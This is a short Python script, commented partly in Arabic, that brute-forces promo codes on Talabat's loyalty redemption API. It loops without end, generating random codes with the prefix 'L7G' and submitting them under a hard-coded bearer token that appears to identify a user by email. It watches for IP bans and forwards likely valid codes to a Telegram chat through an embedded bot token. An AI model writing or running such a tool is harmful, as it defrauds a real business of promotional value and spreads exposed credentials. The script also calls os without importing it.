import requests
import json
import random
import string
import telebot
####bot spam ###
tok = "7620190655:AAHjHgkGbCBLox7y_7pwxD6Y4tnPCgWptMI"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
def generate_random_code():
    # تثبيت الجزء "L7G"
    fixed_part = "L7G"
    
    # توليد 5 أحرف وأرقام عشوائية
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
    
    # دمج الجزء الثابت مع الجزء العشوائي
    return fixed_part + random_part
def t():
    code=generate_random_code()
    url = "https://loyalty.talabat.com/api/v3/me/promo-codes/redeem"
    
    payload = json.dumps({
      "promoCode":code,
      "country": 9
    })
    print(code)
    
    headers = {
      'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
      'Accept-Encoding': "gzip",
      'Content-Type': "application/json",
     # 'x-perseussessionid': "1721863131871.485423224486340084.tPVVBwiBvD",
      #'x-device-version': "11.210",
     # 'x-device-source': "",
      #'x-perseusclientid': "1721863131857.493687602552868028.AdQcj2fDun",
      'authorization': "bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleW1ha2VyLXRhbGFiYXQtMDAyNi1hbmRyb2lkIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwczovL3RhbGFiYXQuZGgtYXV0aC5pbyIsInN1YiI6IjQyODc0MTg3IiwiYXVkIjoiYW5kcm9pZCIsImV4cCI6MTczNzQzODAxNSwiaWF0IjoxNzM3Mzk0ODE1LCJqdGkiOiIwNDc4ODY4bG44aXAwcWp1aWwyazZqNTUxbjh6ZXZoOGJsM255Zm9rIiwic2NvcGUiOiIiLCJtZXRhZGF0YSI6eyJlbWFpbCI6InRhcmVra2FyaXptYTFAZ21haWwuY29tIn19.XVF6HRGnTEHLF4L5u3A_GY0rUwn0Io2MvFuuvgclM0Q-OqDnUmxowUqujmHqaY9KOkf-DSgxOKlEi0Re38-vJH564atHJy-yTZfJxWm4svFWQf4meDd2l03lthyNr-s634pm6N9iIcX-Y6U7CfEZOho41Vx64pxuPSPYkcQe17Lzo3yri3EpTncWh8TOJUSFg8dq7tPgISi_w0MYNr4EzA9iPznFCZNf1qv6pSwIUD6k6xolNljg22_dyVQAQSLKA_8QxJSpNETdXdfxzGQIPNFqL3IOHe3MFAAcwSXmxpImL05-5TpA9X_yda9sS-PSOHiJPsuHUCQGaHVdKsRc2A",
      'tokentypekey': "jwt",
      #'appbrand': "1",
      'accept-language': "ar-KW",
      #'x-device-id': "cd2a415e513668a1",
     # 'x-device-framework': "flutter"
    }
    
    response = requests.post(url, data=payload, headers=headers).text
    #print(response)
    if "كود القسيمة هذا غير صحيح،" in response:
        print("BAD")
    elif "هذه الحملة قد وصلت إلى حدها الأقصى"in response:
        print("suspect") 
        botA.send_message(chat_id=ch_id, text=code)
        botA.send_message(chat_id=ch_id, text="suspect")
    elif "الشروط" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif "ساري" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif response == "":pass
    elif "has banned you temporarily from accessing" in response:
        print("IP Ban ")
    else:
        print(response)
        botA.send_message(chat_id=ch_id, text=code)       
while True:
    try:
        t()
        os.system('cls' if os.name == 'nt' else 'clear')
    except:pass
